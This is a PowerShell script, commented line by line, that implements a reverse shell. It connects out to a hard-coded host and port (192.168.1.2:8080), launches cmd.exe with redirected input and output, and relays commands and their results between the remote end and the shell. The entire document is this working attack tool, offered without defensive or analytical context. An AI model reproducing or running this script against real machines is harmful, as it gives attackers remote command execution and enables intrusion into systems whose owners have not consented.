# This function is used to clean up resources and exit the script
function CleanUp {
    if ($client.Connected -eq $true) {
        $client.Close()
    }

    if ($process.ExitCode -ne $null) {
        $process.Close()
    }

    exit
}

# Create a new TCP client and connect to the specified IP address and port
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect('192.168.1.2', 8080)

# Check if the client is connected, and if not, clean up and exit
if ($client.Connected -ne $true) {
    CleanUp
}

# Get the network stream for reading and writing data
$stream = $client.GetStream();

# Create a buffer to store received data
$buffer = New-Object System.Byte[] $client.ReceiveBufferSize

# Create a new process and set up its start info
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0

# Start the process
$process.Start()

# Get the input and output streams of the process
$inputStream = $process.StandardInput
$outputStream = $process.StandardOutput

# Wait for the process to start
Start-Sleep 1

# Create an ASCII encoding object
$encoding = New-Object System.Text.AsciiEncoding

# Read the output from the process and store it in the $output variable
while ($outputStream.Peek() -ne -1) {
    $output += $encoding.GetString($outputStream.Read())
}

# Write the output to the network stream
$stream.Write($encoding.GetBytes($output), 0, $output.Length)

# Reset the $output variable
$output = $null

# Main loop to read and write data between the client and the process
while ($true) {
    # Check if the client is still connected, and if not, clean up and exit
    if ($client.Connected -ne $true) {
        CleanUp
    }

    # Initialize variables for tracking the buffer position and the number of bytes read
    $pos = 0
    $i = 1

    # Read data from the network stream into the buffer
    while (($i -gt 0) -and ($pos -lt $buffer.Length)) {
        $read = $stream.Read($buffer, $pos, $buffer.Length - $pos)
        $pos += $read

        # Check if a newline character (ASCII value 10) is present in the buffer
        if ($pos -and ($buffer[0..$($pos-1)] -contains 10)) {
            break
        }

        # Check if data has been read into the buffer
        if ($pos -gt 0) {
            # Convert the buffer content to a string
            $string = $encoding.GetString($buffer, 0, $pos)

            # Write the string to the process and wait for a short period
            $inputStream.Write($string)
            Start-Sleep 1

            # Check if the process has exited, and if so, clean up and exit
            if ($process.ExitCode -ne $null) {
                CleanUp
            } else {
                # Read the output from the process and append it to the $output variable
                $output = $encoding.GetString($outputStream.Read())

                while ($outputStream.Peek() -ne -1) {
                    $output += $encoding.GetString($outputStream.Read())

                    # Check if the output matches the input string, and if so, reset the $output variable
                    if ($output -eq $string) {
                        $output = ''
                    }
                }

                # Write the output to the network stream
                $stream.Write($encoding.GetBytes($output), 0, $output.Length);

                # Reset the $output and $string variables
                $output = $null
                $string = $null
            }
        } else {
            # Clean up and exit if no data has been read into the buffer
            CleanUp
        }
    }
}
